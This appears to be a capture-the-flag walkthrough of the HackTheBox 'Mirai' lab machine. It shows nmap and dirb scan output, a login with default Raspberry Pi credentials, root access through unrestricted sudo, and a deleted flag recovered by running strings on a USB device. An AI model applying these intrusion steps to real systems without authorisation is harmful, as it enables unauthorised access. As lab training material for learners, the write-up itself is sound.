@@ -1,0 +1,206 @@
+# Mirai
+
+
+
+
+## Discover & Exploit :
+
+**Use Autorecon for enumertion https://github.com/Tib3rius/AutoRecon**
+
+**1. root@kali:/tmp/mirai/results/10.10.10.48/scans# cat _full_tcp_nmap.txt**
+```
+	# Nmap 7.80 scan initiated Thu Sep 10 23:25:01 2020 as: nmap -vv --reason -Pn -A --osscan-guess --version-all -p- -oN /tmp/mirai/results/10.10.10.48/scans/_full_tcp_nmap.txt -oX /tmp/mirai/results/10.10.10.48/scans/xml/_full_tcp_nmap.xml 10.10.10.48
+	Nmap scan report for 10.10.10.48
+	Host is up, received user-set (0.029s latency).
+	Scanned at 2020-09-10 23:25:04 EDT for 118s
+	Not shown: 65529 closed ports
+	Reason: 65529 resets
+	PORT      STATE SERVICE REASON         VERSION
+	22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
+	| ssh-hostkey: 
+	|   1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA)
+	| ssh-dss AAAAB3NzaC1kc3MAAACBAJpzaaGcmwdVrkG//X5kr6m9em2hEu3SianCnerFwTGHgUHrRpR6iocVhd8gN21TPNTwFF47q8nUitupMBnvImwAs8NcjLVclPSdFJSWwTxbaBiXOqyjV5BcKty+s2N8I9neI2coRBtZDUwUiF/1gUAZIimeKOj2x39kcBpcpM6ZAAAAFQDwL9La/FPu1rEutE8yfdIgxTDDNQAAAIBJbfYW/IeOFHPiKBzHWiM8JTjhPCcvjIkNjKMMdS6uo00/JQH4VUUTscc/LTvYmQeLAyc7GYQ/AcLgoYFHm8hDgFVN2D4BQ7yGQT9dU4GAOp4/H1wHPKlAiBuDQMsyEk2s2J+60Rt+hUKCZfnxPOoD9l+VEWfZQYCTOBi3gOAotgAAAIBd6OWkakYL2e132lg6Z02202PIq9zvAx3tfViuU9CGStiIW4eH4qrhSMiUKrhbNeCzvdcw6pRWK41+vDiQrhV12/w6JSowf9KHxvoprAGiEg7GjyvidBr9Mzv1WajlU9BQO0Nc7poV2UzyMwLYLqzdjBJT28WUs3qYTxanaUrV9g==
+	|   2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA)
+	| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCpSoRAKB+cPR8bChDdajCIpf4p1zHfZyu2xnIkqRAgm6Dws2zcy+VAZriPDRUrht10GfsBLZtp/1PZpkUd2b1PKvN2YIg4SDtpvTrdwAM2uCgUrZdKRoFa+nd8REgkTg8JRYkSGQ/RxBZzb06JZhRSvLABFve3rEPVdwTf4mzzNuryV4DNctrAojjP4Sq7Msc24poQRG9AkeyS1h4zrZMbB0DQaKoyY3pss5FWJ+qa83XNsqjnKlKhSbjH17pBFhlfo/6bGkIE68vS5CQi9Phygke6/a39EP2pJp6WzT5KI3Yosex3Br85kbh/J8CVf4EDIRs5qismW+AZLeJUJHrj
+	|   256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA)
+	| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCl89gWp+rA+2SLZzt3r7x+9sXFOCy9g3C9Yk1S21hT/VOmlqYys1fbAvqwoVvkpRvHRzbd5CxViOVih0TeW/bM=
+	|   256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (ED25519)
+	|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILvYtCvO/UREAhODuSsm7liSb9SZ8gLoZtn7P46SIDZL
+	53/tcp    open  domain  syn-ack ttl 63 dnsmasq 2.76
+	| dns-nsid: 
+	|_  bind.version: dnsmasq-2.76
+	80/tcp    open  http    syn-ack ttl 63 lighttpd 1.4.35
+	| http-methods: 
+	|_  Supported Methods: OPTIONS GET HEAD POST
+	|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+	1286/tcp  open  upnp    syn-ack ttl 63 Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
+	32400/tcp open  http    syn-ack ttl 63 Plex Media Server httpd
+	| http-auth: 
+	| HTTP/1.1 401 Unauthorized\x0D
+	|_  Server returned status 401 but no WWW-Authenticate header.
+	|_http-cors: HEAD GET POST PUT DELETE OPTIONS
+	|_http-title: Unauthorized
+	32469/tcp open  upnp    syn-ack ttl 63 Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
+	Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.4 (95%), Linux 4.2 (95%), Linux 4.8 (95%), Linux 4.9 (95%)
+	No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+	TCP/IP fingerprint:
+	OS:SCAN(V=7.80%E=4%D=9/10%OT=22%CT=1%CU=39267%PV=Y%DS=2%DC=T%G=Y%TM=5F5AEE8
+	OS:7%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10C%TI=Z%CI=I%TS=8)SEQ(SP=1
+	OS:02%GCD=1%ISR=10C%TI=Z%TS=8)OPS(O1=M54DST11NW6%O2=M54DST11NW6%O3=M54DNNT1
+	OS:1NW6%O4=M54DST11NW6%O5=M54DST11NW6%O6=M54DST11)WIN(W1=7120%W2=7120%W3=71
+	OS:20%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW6%CC=Y%Q=
+	OS:)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W
+	OS:=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
+	OS:T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S
+	OS:+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUC
+	OS:K=G%RUD=G)U1(R=N)IE(R=Y%DFI=N%T=40%CD=S)
+	
+	Uptime guess: 0.002 days (since Thu Sep 10 23:24:27 2020)
+	Network Distance: 2 hops
+	TCP Sequence Prediction: Difficulty=258 (Good luck!)
+	IP ID Sequence Generation: All zeros
+	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+	
+	TRACEROUTE (using port 587/tcp)
+	HOP RTT      ADDRESS
+	1   25.92 ms 10.10.14.1
+	2   26.26 ms 10.10.10.48
+	
+	Read data files from: /usr/bin/../share/nmap
+	OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+	# Nmap done at Thu Sep 10 23:27:03 2020 -- 1 IP address (1 host up) scanned in 125.24 seconds
+```	
+**2. root@kali:~# dirb http://10.10.10.48/**
+```
+	
+	-----------------
+	DIRB v2.22    
+	By The Dark Raver
+	-----------------
+	
+	START_TIME: Fri Sep 11 21:54:56 2020
+	URL_BASE: http://10.10.10.48/
+	WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+	
+	-----------------
+	
+	GENERATED WORDS: 4612                                                          
+	
+	---- Scanning URL: http://10.10.10.48/ ----
+	==> DIRECTORY: http://10.10.10.48/admin/                                                                                                                                                             
+	+ http://10.10.10.48/swfobject.js (CODE:200|SIZE:61)                                                                                                                                                 
+	                                                                                                                                                                                                     
+	---- Entering directory: http://10.10.10.48/admin/ ----
+	+ http://10.10.10.48/admin/.git/HEAD (CODE:200|SIZE:23)                                                                                                                                              
+	==> DIRECTORY: http://10.10.10.48/admin/img/                                                                                                                                                         
+	+ http://10.10.10.48/admin/index.php (CODE:200|SIZE:14620)                                                                                                                                           
+	                                                                                                                                                                                                     
+	(!) FATAL: Too many errors connecting to host
+	    (Possible cause: OPERATION TIMEOUT)
+	                                                                               
+	-----------------
+	END_TIME: Fri Sep 11 22:02:47 2020
+	DOWNLOADED: 6892 - FOUND: 3
+```
+	
+**3. Default username and password for pi-hole**
+
+	    username:pi
+	    password:raspberry
+	
+https://blog.cryptoaustralia.org.au/instructions-for-setting-up-pi-hole/
+
+	
+**4. Ssh pi@10.10.10.48**
+
+
+
+## Privilege Escalation 
+
+**1. pi@raspberrypi:~ $ sudo -l**
+```
+    Matching Defaults entries for pi on localhost:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User pi may run the following commands on localhost:
+    (ALL : ALL) ALL
+    (ALL) NOPASSWD: ALL
+```
+
+**2. Sudo bash** 
+
+**3. root@raspberrypi:~# mount**
+```
+	sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
+	proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
+	tmpfs on /run type tmpfs (rw,nosuid,relatime,size=102396k,mode=755)
+	/dev/sda1 on /lib/live/mount/persistence/sda1 type iso9660 (ro,noatime)
+	/dev/loop0 on /lib/live/mount/rootfs/filesystem.squashfs type squashfs (ro,noatime)
+	tmpfs on /lib/live/mount/overlay type tmpfs (rw,relatime)
+	/dev/sda2 on /lib/live/mount/persistence/sda2 type ext4 (rw,noatime,data=ordered)
+	aufs on / type aufs (rw,noatime,si=f1429df6,noxino)
+	devtmpfs on /dev type devtmpfs (rw,nosuid,size=10240k,nr_inodes=58955,mode=755)
+	securityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime)
+	tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
+	devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000)
+	tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k)
+	tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755)
+	cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,release_agent=/lib/systemd/systemd-cgroups-agent,name=systemd)
+	pstore on /sys/fs/pstore type pstore (rw,nosuid,nodev,noexec,relatime)
+	cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)
+	cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)
+	cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)
+	cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)
+	cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio)
+	cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)
+	cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)
+	systemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=22,pgrp=1,timeout=300,minproto=5,maxproto=5,direct)
+	debugfs on /sys/kernel/debug type debugfs (rw,relatime)
+	hugetlbfs on /dev/hugepages type hugetlbfs (rw,relatime)
+	mqueue on /dev/mqueue type mqueue (rw,relatime)
+	tmpfs on /tmp type tmpfs (rw,nosuid,nodev,relatime)
+	
+	/dev/sdb on /media/usbstick type ext4 (ro,nosuid,nodev,noexec,relatime,data=ordered)
+	
+	tmpfs on /run/user/999 type tmpfs (rw,nosuid,nodev,relatime,size=51200k,mode=700,uid=999,gid=997)
+	tmpfs on /run/user/1000 type tmpfs (rw,nosuid,nodev,relatime,size=51200k,mode=700,uid=1000,gid=1000)
+```	
+**4. root@raspberrypi:~# cd /media/usbstick**
+```
+	root@raspberrypi:/media/usbstick# ls
+	damnit.txt  lost+found
+	root@raspberrypi:/media/usbstick# cat damnit.txt
+	Damnit! Sorry man I accidentally deleted your files off the USB stick.
+	Do you know if there is any way to get them back?
+	
+	-James
+```
+
+**5. strings command to list the previous commands that happened on /dev/sdb**
+```
+	root@raspberrypi:/media/usbstick# strings /dev/sdb
+	>r &
+	/media/usbstick
+	lost+found
+	root.txt
+	damnit.txt
+	>r &
+	>r &
+	/media/usbstick
+	lost+found
+	root.txt
+	damnit.txt
+	>r &
+	/media/usbstick
+	2]8^
+	lost+found
+	root.txt
+	damnit.txt
+	>r &
+	3dXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+	Damnit! Sorry man I accidentally deleted your files off the USB stick.
+	Do you know if there is any way to get them back?
+	-James
+```
+	
